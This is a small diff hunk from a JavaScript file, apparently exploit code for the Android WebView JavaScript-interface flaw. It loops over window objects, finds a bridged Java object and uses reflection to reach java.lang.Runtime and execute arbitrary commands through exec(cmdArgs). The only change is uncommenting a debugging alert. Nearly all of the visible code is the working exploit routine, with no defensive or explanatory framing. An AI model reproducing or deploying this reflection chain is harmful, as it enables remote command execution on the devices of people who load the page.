@@ -23,7 +23,7 @@
         for (var obj in window) {
             //console.log(obj);
             if ("getClass" in window[obj]) {
-                //alert(window[obj].getClass());
+                alert(window[obj].getClass());
                 return window[obj].getClass().getClassLoader().loadClass( "java.lang.Runtime" ).
                     getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs);
              }
